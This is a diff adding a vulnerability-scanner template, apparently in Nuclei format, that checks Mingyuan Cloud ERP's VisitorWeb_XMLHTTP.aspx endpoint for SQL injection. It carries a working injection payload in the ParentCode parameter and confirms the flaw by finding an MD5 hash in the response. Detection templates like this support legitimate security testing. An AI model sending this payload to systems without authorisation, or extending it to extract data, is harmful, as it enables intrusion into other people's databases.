@@ -1,0 +1,25 @@
+id: mingyuan-erp-visitorwebxmlhttp-sqli
+info:
+  name: 明源云 ERP visitorwebxmlhttp 接口 - SQL 注入漏洞
+  author: 2husky
+  severity: high
+  reference:
+    - https://www.ddpoc.com/poc/DVB-2023-4937.html
+  metadata:
+    verified: true
+    max-request: 1
+    vuln-id: CT-845371
+    vendor: mingyuanyun
+    product: erp
+  tags: sqli,vuln,mingyuan,erp
+variables:
+  s1: '{{to_lower(rand_text_alpha(8))}}'
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/cgztbweb/VisitorWeb/VisitorWeb_XMLHTTP.aspx?ParentCode=1%27%20and%201=sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27{{s1}}%27));--&ywtype=GetParentProjectName'
+    redirects: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, md5(s1))'
